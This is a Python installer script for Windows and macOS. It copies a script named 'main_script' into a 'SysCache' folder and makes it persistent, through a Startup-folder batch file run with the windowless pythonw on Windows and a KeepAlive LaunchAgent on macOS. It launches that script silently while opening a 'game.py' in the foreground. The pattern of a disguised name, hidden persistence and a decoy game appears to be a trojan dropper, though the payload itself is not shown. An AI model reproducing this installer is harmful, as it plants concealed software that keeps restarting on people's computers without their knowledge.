import os
import sys
import shutil
import subprocess
import platform

APP_NAME = "SysCache"
MAC_LABEL = "com.syscache"

SYSTEM = platform.system()
IS_WINDOWS = SYSTEM == "Windows"
IS_MAC = SYSTEM == "Darwin"

if IS_WINDOWS:
    APPDATA = os.getenv("APPDATA")
    if not APPDATA:
        raise RuntimeError("APPDATA não encontrado.")
    INSTALL_DIR = os.path.join(APPDATA, APP_NAME)
    STARTUP_DIR = os.path.join(
        APPDATA,
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup",
    )
elif IS_MAC:
    INSTALL_DIR = os.path.expanduser(f"~/Library/Application Support/{APP_NAME}")
else:
    raise RuntimeError(f"Sistema não suportado: {SYSTEM}")


def get_resource_path(filename: str) -> str:
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, filename)
    base_dir = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_dir, filename)


def create_install_dir() -> None:
    os.makedirs(INSTALL_DIR, exist_ok=True)


def copy_file_to_install(filename: str) -> str:
    src = get_resource_path(filename)
    if not os.path.exists(src):
        raise FileNotFoundError(f"Arquivo não encontrado: {src}")

    dst = os.path.join(INSTALL_DIR, filename)
    shutil.copy2(src, dst)
    return dst


def get_pythonw_path() -> str:
    pythonw = shutil.which("pythonw")
    if pythonw:
        return pythonw

    exe = sys.executable
    if exe.lower().endswith("python.exe"):
        candidate = exe[:-10] + "pythonw.exe"
        if os.path.exists(candidate):
            return candidate

    raise FileNotFoundError("pythonw.exe não encontrado no sistema.")


def get_python_path() -> str:
    python = shutil.which("python")
    if python:
        return python

    exe = sys.executable
    if exe.lower().endswith("pythonw.exe"):
        candidate = exe[:-11] + "python.exe"
        if os.path.exists(candidate):
            return candidate

    return exe


def install_windows() -> None:
    main_script_path = copy_file_to_install("main_script.py")
    game_path = copy_file_to_install("game.py")

    pythonw = get_pythonw_path()
    python = get_python_path()

    os.makedirs(STARTUP_DIR, exist_ok=True)
    bat_path = os.path.join(STARTUP_DIR, "syscache_launcher.bat")

    bat_content = f'''@echo off
start "" "{pythonw}" "{main_script_path}"
exit
'''

    with open(bat_path, "w", encoding="utf-8") as f:
        f.write(bat_content)

    subprocess.Popen([pythonw, main_script_path], shell=False)
    subprocess.Popen([python, game_path], shell=False)


def install_mac() -> None:
    main_script_path = copy_file_to_install("main_script_mac.py")
    game_path = copy_file_to_install("game.py")

    python_bg = shutil.which("python3") or sys.executable
    python_fg = shutil.which("python3") or sys.executable
    plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{MAC_LABEL}.plist")

    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{MAC_LABEL}</string>

    <key>ProgramArguments</key>
    <array>
        <string>{python_bg}</string>
        <string>{main_script_path}</string>
    </array>

    <key>RunAtLoad</key>
    <true/>

    <key>KeepAlive</key>
    <true/>

    <key>WorkingDirectory</key>
    <string>{INSTALL_DIR}</string>
</dict>
</plist>
"""

    os.makedirs(os.path.dirname(plist_path), exist_ok=True)
    with open(plist_path, "w", encoding="utf-8") as f:
        f.write(plist_content)

    subprocess.run(
        ["launchctl", "unload", plist_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(["launchctl", "load", plist_path], check=True)

    subprocess.Popen([python_bg, main_script_path], shell=False)
    subprocess.Popen([python_fg, game_path], shell=False)


if __name__ == "__main__":
    create_install_dir()

    if IS_WINDOWS:
        install_windows()
    elif IS_MAC:
        install_mac()